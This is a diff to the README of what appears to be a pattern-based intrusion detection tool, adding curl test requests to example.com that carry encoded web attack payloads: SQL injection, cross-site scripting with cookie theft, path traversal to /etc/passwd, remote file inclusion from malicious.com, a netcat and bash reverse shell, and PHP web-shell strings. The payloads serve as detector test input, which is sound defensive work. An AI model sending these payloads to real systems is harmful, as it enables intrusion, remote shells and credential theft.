@@ -11,6 +11,35 @@ sudo ./detection.out patternfile
 ```
 curl "http://example.com/whois_raw.cgi?fqdn=%0acat%20/etc/passwd"
 curl "http://example.com/faxsurvey?/bin/cat%20/etc/passwd"
+curl "http://example.com/search?query=%27%20OR%20%271%27=%271"
+curl "http://example.com/search?query=UNION%20SELECT%20null,%20null"
+curl "http://example.com/search?query=%27%20OR%201=1;--"
+curl "http://example.com/search?query=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E"
+curl "http://example.com/search?query=%3Cimg%20src=x%20onerror=alert(%27XSS%27)%3E"
+curl "http://example.com/search?query=%3Ciframe%20src=javascript:alert(%27XSS%27)%3E"
+curl "http://example.com/file=../../../../etc/passwd"
+curl "http://example.com/file=../../../../etc/passwd"
+curl "http://example.com/include=http://malicious.com/shell.txt"
+curl "http://example.com/search?query=%7C%20wget%20http://malicious.com"
+curl "http://example.com/search?query=%7C%20nc%20-e%20/bin/sh"
+curl "http://example.com/search?query=%7C%20/bin/bash%20-i%20%3E%26%20/dev/tcp/0.0.0.0/1234%200%3E%261"
+curl "http://example.com/search?query=%2A%29%28%7C%28cn=%2A%29%29"
+curl "http://example.com/search?query=;%20/bin/bash%20-c%20%27cat%20/etc/passwd%27"
+curl "http://example.com/search?query=1%27%20AND%201=1--"
+curl "http://example.com/search?query=1%27%20WAITFOR%20DELAY%20%270:0:5%27--"
+curl "http://example.com/search?query=%3Cstyle%3E@import%27javascript:alert(%27XSS%27)%27%3C/style%3E"
+curl "http://example.com/search?query=%3Fphp=system(%24_GET[%27cmd%27]);%3E"
+curl "http://example.com/search?query=%3Cbody%20onload=alert(%27XSS%27)%3E"
+curl "http://example.com/search?query=%27%20OR%201=1%20--"
+curl "http://example.com/search?query=%27;%20WAITFOR%20DELAY%20%270:0:5%27%20--"
+curl "http://example.com/search?query=%3Csvg%20onload=alert(%27XSS%27)%3E"
+curl "http://example.com/search?query=%3Clink%20rel=stylesheet%20href=javascript:alert(%27XSS%27)%3E"
+curl "http://example.com/search?query=%3Cscript%3Ealert(document.cookie)%3C/script%3E"
+curl "http://example.com/search?query=%3Fphp=system(%24_GET[%27cmd%27]);%3E"
+curl "http://example.com/search?query=file=http://example.com/shell.txt?"
+
+
+
 ```
 
 项目运行方法：
